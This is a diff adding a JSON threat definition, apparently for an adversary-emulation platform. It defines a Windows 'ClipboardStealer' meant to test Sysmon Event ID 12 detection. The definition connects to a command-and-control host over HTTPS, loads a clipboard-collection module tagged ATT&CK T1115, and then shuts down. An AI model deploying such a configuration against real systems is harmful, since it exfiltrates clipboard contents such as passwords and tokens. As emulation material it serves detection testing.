@@ -1,0 +1,47 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Clipboard Stealer for testing Sysmon Event ID 12",
+        "display_name": "ClipboardStealer",
+        "name": "ClipboardStealer",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "unicorn.scythedemo.com:443",
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "clipboard",
+                "request": "--load clipboard",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "833ad3b4-679c-4078-8153-cf4d6f979b8b",
+                "module": "clipboard",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1115"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
